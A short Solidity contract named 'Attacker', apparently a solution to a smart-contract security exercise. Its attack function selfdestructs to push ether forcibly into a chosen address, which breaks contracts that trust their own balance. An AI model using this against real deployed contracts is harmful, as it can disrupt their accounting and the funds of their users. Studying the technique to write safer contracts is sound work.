// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract Attacker{

    constructor() public payable{
    }

    function attack(address payable _to) public payable returns(bool success){

        selfdestruct(_to);

        return success;
    }
}
